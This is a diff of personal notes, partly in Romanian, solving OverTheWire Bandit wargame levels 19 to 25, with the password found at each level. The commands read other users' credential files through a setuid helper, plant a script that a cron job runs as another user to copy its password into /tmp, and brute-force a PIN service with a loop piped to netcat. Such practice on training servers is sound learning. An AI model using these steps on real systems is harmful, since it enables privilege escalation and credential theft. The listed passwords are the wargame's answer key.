@@ -154,6 +154,82 @@ LEVEL_18: ssh -i key bandit18@bandit.labs.overthewire.org -p 2220 hga5tuuCLF6fFz
 ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat ~/readme"
 PAROLA: awhqfNnAbc1naukrpqDYcF95h7HoMTrC
 
+LEVEL_19: ssh bandit19@bandit.labs.overthewire.org -p 2220 awhqfNnAbc1naukrpqDYcF95h7HoMTrC
+
+ls -la
+./bandit20-do id
+./bandit20-do cat /etc/bandit_pass/bandit20
+PAROLA: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+
+LEVEL_20: ssh bandit20@bandit.labs.overthewire.org -p 2220 VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+
+cat /etc/bandit_pass/bandit20
+nmap -F localhost
+cat /etc/bandit_pass/bandit20 | netcat -lp 1234 &
+./suconnect 1234
+PAROLA: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+LEVEL_21: ssh bandit21@bandit.labs.overthewire.org -p 2220 NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+ls -la
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+PAROLA: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+
+LEVEL_22: ssh bandit22@bandit.labs.overthewire.org -p 2220 WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+
+ls -la
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo "I am user bandit23" | md5sum | cut -d' ' -f1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+PAROLA: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+LEVEL_23: ssh bandit23@bandit.labs.overthewire.org -p 2220 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+cd /tmp
+mkdir cristinel
+cd /tmp/cristinel/
+touch scriptuleanu.sh -> in el punem cat /etc/bandit_pass/bandit24 > /tmp/cristinel/parola
+touch parola
+chmod 777 scriptuleanu.sh
+chmod 777 parola
+cp /tmp/cristinel/scriptuleanu.sh /var/spool/bandit24/foo/
+cat /tmp/cristinel/parola
+PAROLA: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+LEVEL_24: ssh bandit24@bandit.labs.overthewire.org -p 2220 VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+ls /etc/cron.d/
+cat /etc/bandit_pass/bandit24 -> VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+mkdir /tmp/cristinell
+cd /tmp/cristinell
+vim script.sh 
+->>>>
+#!/bin/bash
+bandit24="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
+for i in {0000..9999}
+do
+	echo "$bandit24 $i"
+done | nc localhost 30002
+->>>>
+./script.sh
+PAROLA: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+LEVEL_25: ssh bandit25@bandit.labs.overthewire.org -p 2220 p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+
+
+
+
+
+
 
 
 
